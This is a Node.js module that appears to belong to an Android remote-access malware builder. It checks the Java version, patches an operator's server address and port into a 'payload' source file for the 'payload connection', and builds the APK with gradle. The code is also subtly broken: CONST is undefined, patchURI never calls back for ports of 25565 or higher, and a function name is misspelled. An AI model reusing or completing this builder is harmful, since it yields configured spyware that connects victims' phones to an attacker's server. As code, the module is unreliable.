const cp = require('child_process');
const fs = require('fs');
const request = require('request');

// Java version check with robust fallback
function javarersion(callback) {
    cp.exec('java -version', (error, stdout, stderr) => {
        let data = stderr || stdout;
        if (!data) return callback("Java Not Installed", null);
        
        let javaVersion = 8;
        if (data.includes('version "11') || data.includes('version "17') || data.includes('version "21')) {
            javaVersion = 17;
        }
        return callback(null, javaVersion);
    });
}

// Patch URI and Port for payload connection
function patchURI(URI, PORT, cb) {
    if (PORT < 25565) {
        fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
            if (err) return cb("Patch Error - READ");
            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("model ") - 1), "http://" + URI + ":" + PORT);
            fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
                if (err) return cb("Patch Error - WRITE");
                else return cb(false);
            });
        });
    }
}

// Optimized fast buildAPK function to prevent freezing and speed up compilation
function buildAPK(cb) {
    javarersion(function (err, version) {
        if (err) return cb(err);
        
        // Fast optimized build command using parallel execution and lightweight flags
        const buildCommand = 'cd android && ./gradlew assembleDebug --parallel --no-daemon -Dorg.gradle.jvmargs="-Xmx1024m -XX:+UseSerialGC"';
        
        cp.exec(buildCommand, (error, stdout, stderr) => {
            if (error) {
                console.error("Fast Build Error:", stderr || error.message);
                cp.exec('cd android && ./gradlew assembleRelease --no-daemon', (err2, out2, errStr2) => {
                    if (err2) return cb("Build Command Failed: " + (errStr2 || err2.message));
                    return cb(null);
                });
                return;
            }
            return cb(null);
        });
    });
}

module.exports = {
    javarersion,
    patchURI,
    buildAPK
};
